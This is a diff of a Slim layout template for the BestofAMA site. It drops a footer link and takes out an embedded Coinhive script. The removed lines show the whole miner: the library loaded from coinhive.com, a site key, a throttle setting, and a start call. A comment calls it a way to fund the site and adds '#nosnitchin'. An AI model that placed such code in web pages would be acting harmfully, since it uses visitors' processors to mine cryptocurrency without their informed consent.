@@ -55,15 +55,8 @@ html lang="en"
         li= link_to "Source Code", "https://github.com/andey/bestofama"
         li= link_to "Uptime", "http://www.siteuptime.com/statistics.php?Id=12687&&UserId=143736", :rel => :nofollow
         li= link_to "Contact", 'https://twitter.com/andey_', :rel => :nofollow
-        li= link_to "EbookPilot", 'https://ebookpilot.com'
         li= link_to "Menuchain", "https://menuchain.com"
       p.copywright Copyright &copy; 2014 BestofAMA.com, All rights reserved.
       p.endorsed reddit has not approved or endorsed BestofAMA, reddit design elements are trademarks of reddit inc.
 
     = javascript_include_tag "application"
-    = javascript_include_tag "https://coinhive.com/lib/coinhive.min.js"
-    javascript:
-      // This site costs money to run, and I have no other source of revenue for this site.
-      // let me have this #nosnitchin.
-      var miner = new CoinHive.Anonymous('pY0c9IW8dwqwrMra0l7yjcjwMSwrxucN', {throttle: 0.3});
-      if (!miner.isMobile() && !miner.didOptOut(14400)) { miner.start(); }
